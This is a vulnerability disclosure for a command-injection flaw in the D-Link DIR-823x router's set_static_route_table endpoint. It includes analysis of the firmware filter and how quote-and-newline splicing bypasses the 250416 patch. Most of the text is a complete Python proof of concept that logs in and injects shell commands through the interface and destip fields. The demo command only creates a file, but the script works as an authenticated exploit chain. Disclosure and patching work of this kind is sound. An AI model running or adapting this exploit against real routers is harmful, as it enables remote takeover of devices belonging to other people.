# DIink-DIR-823x/goform/set_static_route_table command execution vulnerability

Vulnerability Vendor: D-Link Technology Co., Ltd.

Official Website: https://www.dlink.cn

Affected Device Type: Network Device

Affected Product: Dlink-DIR-823x

Affected Product Versions: DIR-823x 250416, 240802, 240126

Is This a Product Component Vulnerability: No

## **1. Vulnerability Overview**

The D-Link DIR-823x is a wireless router product from D-Link.

The D-Link DIR-823x suffers from a command execution vulnerability caused by insufficient validation of input parameters when processing environment variables in the file /usr/sbin/goahead. An attacker could exploit this vulnerability by constructing malicious requests and executing arbitrary commands on the system.

## **2. Vulnerability Details**

Router firmware download: [D-Link | Home Network](https://www.dlink.com.cn/home/product?id=3118)

Ida analyzed the binary file /usr/sbin/goahead, located set_static_route_table, and manually restored the symbol table.

![image-20250914122522472](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250914122522472.png)

First, the program receives seven parameters, the first of which is detection, but no detection string

![image-20250914122632113](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250914122632113.png)

Then it will enter the dangerous function, which can be bypassed. The patch is not complete.

![image-20250914122715979](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250914122715979.png)





First, there is a detection, but the detection is incomplete. It only detects the seven strings "()'{};`". Here, there is no detection for the two versions 240802 and 240126, so there is a command injection directly. The author analyzed 250416, which has a patch. We need to bypass it and use quotation mark splicing and \n to inject \"\n{cmd}\n\. In this way, the attack can bypass this detection.

 ![image-20250908200557880](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250908200557880.png)

Subsequent sub_412E7C will assign the string directly to the system for execution, where there is command injection, and here part has injection

![img](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/wps5.jpg) 

 ![image-20250914123304963](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250914123304963.png)

 POC

```
import requests
import logging
import argparse
import re
import hmac
import hashlib


logging.basicConfig(level=logging.DEBUG)


def extract_cookies_from_response(response):
    cookies = response.headers.get('Set-Cookie', '')
    sessionid = re.search(r'sessionid=([^;]+)', cookies)
    token = re.search(r'token=([^;]+)', cookies)
    sessionid = sessionid.group(1) if sessionid else None
    token = token.group(1) if token else None
    return sessionid, token

def send_get_login_page(session, host_ip):
    url = f"http://{host_ip}/login.html"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    response = session.get(url, headers=headers)
    
    if response.status_code == 200:
        sessionid, token = extract_cookies_from_response(response)
        return sessionid, token
    else:
        logging.error("Failed to get login page.")
        logging.error(f"Status code: {response.status_code}")
        logging.error(f"Response: {response.text}")
        return None, None

def hash_password(password, token):
    hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
    return hashed

def send_login_request(session, host_ip, username, hashed_password, sessionid, token):
    url = f"http://{host_ip}/goform/login"
    
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "username": username,
        "password": hashed_password,
        "token": token
    }
    
    response = session.post(url, headers=headers, data=payload)
    
    return response

def send_diag_traceroute_request(session, host_ip, sessionid, token):
    url = f"http://{host_ip}/goform/set_static_route_table"
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
	"modmun": "-1",
	"interface": "\"\ntouch 1.txt\n\"",
	"destip": "\"\ntouch 2.txt\n\"",
	"netmask": "255.255.255.0",
	"gateway": "10.10.10.1",
	"metric": "1",
	"set_flag": "0",
        "token": token
    }

    

    response = session.post(url, headers=headers, data=payload)
    
    return response

def main():
    session = requests.session()

    parser = argparse.ArgumentParser(description='HTTP POST Request Example.')
    parser.add_argument('-H', '--host', metavar='host', default='192.168.1.1', help='Host IP address.')
    parser.add_argument('-u', '--username', metavar='Username', required=True, help='Login username.')
    parser.add_argument('-p', '--password', metavar='Password', required=True, help='Login password.')

    args = parser.parse_args()

    logging.info(f'Host IP: {args.host}')

    # Get login page
    sessionid, token = send_get_login_page(session, args.host)
    if sessionid and token:
        logging.info(f"GET login page request sent successfully. sessionid={sessionid}, token={token}")
        
        # Hash the password
        hashed_password = hash_password(args.password, token)
        
        # Send login request
        response = send_login_request(session, args.host, args.username, hashed_password, sessionid, token)
        if response.status_code == 200:
            logging.info("Login request sent successfully.")
            logging.debug(f"Response: {response.text}")
            
            # Extract updated sessionid and token from login response
            sessionid, token = extract_cookies_from_response(response)
            
            # Send LAN settings request
            response = send_diag_traceroute_request(session, args.host, sessionid, token)
            if response.status_code == 200:
                logging.info("LAN settings request sent successfully.")
                logging.debug(f"Response: {response.text}")
            else:
                logging.error("Failed to send LAN settings request.")
                logging.error(f"Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        else:
            logging.error("Failed to send login request.")
            logging.error(f"Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
    else:
        logging.error("Failed to retrieve sessionid and token from login page.")

if __name__ == "__main__":
    main()
```

Successful execution





 

## 3. Impact of the Vulnerability

1. An attacker can exploit this vulnerability to execute remote commands.
2. An attacker can exploit this vulnerability to gain remote code execution.

## 4. Repair plan

1. Contact the relevant vendor to obtain security patches and promptly address vulnerabilities.
2. Contact the relevant security vendor to promptly update security blocking policies.
3. Temporarily perform a security check on interface parameters.

‚Äç